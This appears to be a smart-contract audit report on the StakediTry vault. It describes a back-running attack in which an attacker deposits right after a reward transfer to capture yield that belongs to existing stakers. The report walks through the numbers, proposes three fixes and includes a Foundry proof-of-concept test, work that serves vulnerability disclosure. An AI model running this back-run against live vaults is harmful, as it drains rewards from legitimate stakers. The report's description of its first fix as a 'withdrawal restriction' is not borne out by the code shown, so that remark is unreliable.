## Title
Back-Running Attack on Reward Distribution Allows Unfair Yield Capture Through Vesting Mechanism Exploitation

## Summary
The StakediTry vault's linear vesting mechanism for rewards creates a window where attackers can back-run `transferInRewards()` transactions to capture a disproportionate share of newly distributed yield. Because unvested rewards are excluded from `totalAssets()`, the share price doesn't reflect pending rewards, allowing attackers to deposit at the old rate and immediately benefit from the vesting rewards they didn't earn.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/token/wiTRY/StakediTry.sol` - `transferInRewards()` function (lines 113-119), `totalAssets()` (lines 192-194), `getUnvestedAmount()` (lines 199-211), and `_updateVestingAmount()` (lines 280-285)

**Intended Logic:** The vesting mechanism should gradually distribute rewards to existing stakers over a configured period (1 hour to 30 days), preventing immediate reward extraction and encouraging long-term staking. [1](#0-0) 

**Actual Logic:** The vesting mechanism excludes unvested rewards from `totalAssets()`, which is used for ERC4626 share price calculations. This creates a critical vulnerability where the share price immediately after reward distribution doesn't reflect the incoming rewards, allowing attackers to deposit at the pre-reward price and dilute existing stakers. [2](#0-1) [3](#0-2) 

**Exploitation Path:**

1. **Initial State**: Alice (legitimate staker) has 10,000 shares representing 10,000 iTRY staked over a long period earning protocol yield.

2. **REWARDER Distributes Rewards**: REWARDER_ROLE calls `transferInRewards(10,000 iTRY)` to distribute earned yield to stakers. [4](#0-3) 

3. **State After Transfer**: 
   - Contract balance increases to 20,000 iTRY
   - `vestingAmount` is set to 10,000 iTRY
   - `getUnvestedAmount()` returns 10,000 iTRY (full amount at t=0)
   - `totalAssets()` = 20,000 - 10,000 = 10,000 iTRY (unchanged!)
   - Share price remains at 1.0 iTRY/share [5](#0-4) 

4. **Attacker Back-Runs**: Attacker monitors mempool, sees `transferInRewards()`, and immediately deposits 10,000 iTRY:
   - Shares minted to attacker: 10,000 / 1.0 = 10,000 shares
   - Alice now owns 50% of shares, attacker owns 50%
   - But the attacker didn't contribute during the earning period

5. **Rewards Vest Over Time**: Over the vesting period (minimum 1 hour), `getUnvestedAmount()` decreases linearly:
   - `totalAssets()` gradually increases from 20,000 to 30,000 iTRY
   - Share price increases from 1.0 to 1.5 iTRY/share
   - Both Alice and attacker benefit equally from the vesting

6. **Final Outcome After Vesting**:
   - Alice: 10,000 shares × 1.5 = 15,000 iTRY (gained only 5,000 of the 10,000 reward)
   - Attacker: 10,000 shares × 1.5 = 15,000 iTRY (gained 5,000 of rewards they never earned)
   - **Without attacker**: Alice would have: 10,000 shares × 2.0 = 20,000 iTRY (full 10,000 reward)

**Security Property Broken:** Fair reward distribution among stakers who contributed during the earning period. The attacker captures 50% of rewards despite zero contribution to protocol yield generation.

## Impact Explanation

- **Affected Assets**: iTRY rewards intended for existing wiTRY stakers are diluted and partially stolen by back-running attackers.

- **Damage Severity**: 
  - Attacker captures rewards proportional to their deposit relative to existing TVL
  - With equal deposit to existing TVL: attacker steals 50% of all rewards
  - With 4x deposit: attacker steals 80% of rewards
  - Example: 100,000 iTRY reward with 100,000 iTRY existing TVL and 400,000 iTRY attack = attacker gains 80,000 iTRY, legitimate stakers only get 20,000 iTRY

- **User Impact**: All existing stakers suffer proportional loss. If protocol distributes rewards weekly and attacker back-runs every distribution, existing stakers may receive only 20-50% of their entitled yield over time.

## Likelihood Explanation

- **Attacker Profile**: Any user with sufficient capital can execute this attack. No special privileges required. MEV bots can automate this for every reward distribution.

- **Preconditions**: 
  - Vault must be initialized with existing stakers
  - REWARDER must call `transferInRewards()` (happens regularly per protocol design)
  - Attacker needs capital equal to or exceeding existing TVL for maximum impact
  - No cooldown prevents immediate deposits

- **Execution Complexity**: 
  - Single transaction (deposit) immediately after seeing `transferInRewards()` in mempool
  - Can be automated with MEV infrastructure
  - Attacker must wait through vesting period (1 hour minimum) plus cooldown period (up to 90 days) to exit, but the profit may still exceed opportunity cost [6](#0-5) 

- **Frequency**: Exploitable on every single reward distribution event. If protocol distributes rewards daily/weekly, this compounds existing stakers' losses significantly.

## Recommendation

Implement one of the following mitigations:

**Option 1: Include Unvested Rewards in totalAssets() Calculation**

```solidity
// In src/token/wiTRY/StakediTry.sol, function totalAssets(), line 192:

// CURRENT (vulnerable):
function totalAssets() public view override returns (uint256) {
    return IERC20(asset()).balanceOf(address(this)) - getUnvestedAmount();
}

// FIXED:
function totalAssets() public view override returns (uint256) {
    // Include all rewards (vested and unvested) in share price calculation
    // This ensures new depositors pay fair price reflecting pending rewards
    return IERC20(asset()).balanceOf(address(this));
}

// Note: This makes vesting purely a withdrawal restriction rather than 
// affecting share price. New depositors pay current value including unvested rewards.
```

**Option 2: Add Deposit Delay After Reward Distribution**

```solidity
// Add state variable:
uint256 public lastRewardTimestamp;
uint256 public constant DEPOSIT_DELAY_AFTER_REWARDS = 1 hours;

// Modify _updateVestingAmount():
function _updateVestingAmount(uint256 newVestingAmount) internal {
    if (getUnvestedAmount() > 0) revert StillVesting();
    vestingAmount = newVestingAmount;
    lastDistributionTimestamp = block.timestamp;
    lastRewardTimestamp = block.timestamp; // Track reward timing
}

// Add modifier to _deposit():
function _deposit(address caller, address receiver, uint256 assets, uint256 shares)
    internal
    override
    nonReentrant
    notZero(assets)
    notZero(shares)
{
    // Prevent deposits immediately after reward distribution
    if (block.timestamp < lastRewardTimestamp + DEPOSIT_DELAY_AFTER_REWARDS) {
        revert DepositTooSoonAfterRewards();
    }
    
    if (hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller) || hasRole(SOFT_RESTRICTED_STAKER_ROLE, receiver)) {
        revert OperationNotAllowed();
    }
    super._deposit(caller, receiver, assets, shares);
    _checkMinShares();
}
```

**Option 3: Implement Snapshot-Based Reward Accounting**

Use a checkpoint system where rewards are allocated to shares existing at the time of reward distribution, similar to Curve/Convex reward mechanisms. This requires more significant refactoring but provides the fairest distribution.

**Recommendation**: Option 1 is simplest and most effective. It aligns the share price with the true economic value of the vault, making back-running unprofitable since attackers must pay the fair price including pending rewards.

## Proof of Concept

```solidity
// File: test/Exploit_RewardBackrunning.t.sol
// Run with: forge test --match-test test_BackrunRewardDistribution -vvv

pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/token/wiTRY/StakediTry.sol";
import "./mocks/MockERC20.sol";

contract Exploit_RewardBackrunning is Test {
    StakediTry public vault;
    MockERC20 public iTryToken;
    
    address public admin;
    address public rewarder;
    address public alice; // Legitimate long-term staker
    address public attacker;
    
    bytes32 public constant REWARDER_ROLE = keccak256("REWARDER_ROLE");
    
    function setUp() public {
        admin = makeAddr("admin");
        rewarder = makeAddr("rewarder");
        alice = makeAddr("alice");
        attacker = makeAddr("attacker");
        
        // Deploy iTRY token
        iTryToken = new MockERC20("iTRY", "iTRY");
        
        // Deploy StakediTry vault
        vm.prank(admin);
        vault = new StakediTry(IERC20(address(iTryToken)), rewarder, admin);
        
        // Mint tokens
        iTryToken.mint(alice, 100_000e18);
        iTryToken.mint(attacker, 100_000e18);
        iTryToken.mint(rewarder, 100_000e18);
        
        // Approve vault
        vm.prank(alice);
        iTryToken.approve(address(vault), type(uint256).max);
        
        vm.prank(attacker);
        iTryToken.approve(address(vault), type(uint256).max);
        
        vm.prank(rewarder);
        iTryToken.approve(address(vault), type(uint256).max);
    }
    
    function test_BackrunRewardDistribution() public {
        // SETUP: Alice deposits and stakes for long period (legitimate staker)
        uint256 aliceDeposit = 10_000e18;
        vm.prank(alice);
        uint256 aliceShares = vault.deposit(aliceDeposit, alice);
        
        console.log("=== INITIAL STATE ===");
        console.log("Alice shares:", aliceShares / 1e18);
        console.log("Total supply:", vault.totalSupply() / 1e18);
        console.log("Total assets:", vault.totalAssets() / 1e18);
        console.log("Share price:", (vault.totalAssets() * 1e18) / vault.totalSupply());
        
        // Simulate time passing (Alice earning rewards)
        vm.warp(block.timestamp + 30 days);
        
        // EXPLOIT STEP 1: REWARDER distributes rewards
        uint256 rewardAmount = 10_000e18;
        vm.prank(rewarder);
        vault.transferInRewards(rewardAmount);
        
        console.log("\n=== AFTER REWARD TRANSFER (BEFORE ATTACK) ===");
        console.log("Contract balance:", iTryToken.balanceOf(address(vault)) / 1e18);
        console.log("Unvested amount:", vault.getUnvestedAmount() / 1e18);
        console.log("Total assets:", vault.totalAssets() / 1e18); // Still 10,000!
        console.log("Share price:", (vault.totalAssets() * 1e18) / vault.totalSupply());
        
        // EXPLOIT STEP 2: Attacker back-runs with large deposit
        uint256 attackDeposit = 10_000e18;
        vm.prank(attacker);
        uint256 attackerShares = vault.deposit(attackDeposit, attacker);
        
        console.log("\n=== AFTER ATTACKER DEPOSIT ===");
        console.log("Attacker shares:", attackerShares / 1e18);
        console.log("Alice ownership:", (aliceShares * 100) / vault.totalSupply(), "%");
        console.log("Attacker ownership:", (attackerShares * 100) / vault.totalSupply(), "%");
        
        // EXPLOIT STEP 3: Wait for rewards to vest
        uint256 vestingPeriod = vault.getVestingPeriod();
        vm.warp(block.timestamp + vestingPeriod);
        
        console.log("\n=== AFTER VESTING COMPLETES ===");
        console.log("Total assets:", vault.totalAssets() / 1e18);
        console.log("Share price:", (vault.totalAssets() * 1e18) / vault.totalSupply());
        
        uint256 aliceValue = vault.convertToAssets(aliceShares);
        uint256 attackerValue = vault.convertToAssets(attackerShares);
        
        console.log("\n=== FINAL VALUES ===");
        console.log("Alice value:", aliceValue / 1e18, "iTRY");
        console.log("Alice gain:", (aliceValue - aliceDeposit) / 1e18, "iTRY");
        console.log("Attacker value:", attackerValue / 1e18, "iTRY");
        console.log("Attacker gain:", (attackerValue - attackDeposit) / 1e18, "iTRY");
        
        // VERIFY: Attacker stole half of Alice's rewards
        uint256 aliceGain = aliceValue - aliceDeposit;
        uint256 attackerGain = attackerValue - attackDeposit;
        
        // Alice should have gained full 10,000 reward
        // But she only gained 5,000 (attacker stole the other 5,000)
        assertEq(aliceGain, 5_000e18, "Alice lost half her rewards to attacker");
        assertEq(attackerGain, 5_000e18, "Attacker captured half of rewards");
        
        // Without attacker, Alice would have 20,000 total (100% of rewards)
        uint256 fairAliceValue = 20_000e18;
        assertLt(aliceValue, fairAliceValue, "Alice was robbed of fair rewards");
        
        console.log("\n=== EXPLOIT CONFIRMED ===");
        console.log("Attacker stole", attackerGain / 1e18, "iTRY from legitimate stakers");
        console.log("Alice lost", (fairAliceValue - aliceValue) / 1e18, "iTRY to dilution");
    }
}
```

## Notes

- This vulnerability is particularly severe because it can be automated by MEV bots and executed on every reward distribution
- The cooldown mechanism (up to 90 days) provides some friction but doesn't prevent the attack if the reward yield exceeds the opportunity cost of capital lockup
- The minimum vesting period is only 1 hour, making short-term attacks feasible
- Large capital holders can execute this attack with minimal risk, as they're not exploiting a bug but rather a design flaw in how share prices are calculated
- The protocol could lose significant value to sophisticated attackers who monitor all `transferInRewards()` transactions and automatically back-run them

### Citations

**File:** src/token/wiTRY/StakediTry.sol (L33-36)
```text
    /// @notice Minimum allowed vesting period (1 hour)
    uint256 private constant MIN_VESTING_PERIOD = 1 hours;
    /// @notice Maximum allowed vesting period (30 days)
    uint256 private constant MAX_VESTING_PERIOD = 30 days;
```

**File:** src/token/wiTRY/StakediTry.sol (L113-119)
```text
    function transferInRewards(uint256 amount) external nonReentrant onlyRole(REWARDER_ROLE) notZero(amount) {
        _updateVestingAmount(amount);
        // transfer assets from rewarder to this contract
        IERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);

        emit RewardsReceived(amount);
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L192-194)
```text
    function totalAssets() public view override returns (uint256) {
        return IERC20(asset()).balanceOf(address(this)) - getUnvestedAmount();
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L199-211)
```text
    function getUnvestedAmount() public view returns (uint256) {
        uint256 timeSinceLastDistribution = block.timestamp - lastDistributionTimestamp;

        if (timeSinceLastDistribution >= vestingPeriod) {
            return 0;
        }

        uint256 deltaT;
        unchecked {
            deltaT = (vestingPeriod - timeSinceLastDistribution);
        }
        return (deltaT * vestingAmount) / vestingPeriod;
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L280-285)
```text
    function _updateVestingAmount(uint256 newVestingAmount) internal {
        if (getUnvestedAmount() > 0) revert StillVesting();

        vestingAmount = newVestingAmount;
        lastDistributionTimestamp = block.timestamp;
    }
```

**File:** src/token/wiTRY/StakediTryCooldown.sol (L24-26)
```text
    uint24 public constant MAX_COOLDOWN_DURATION = 90 days;

    uint24 public cooldownDuration;
```
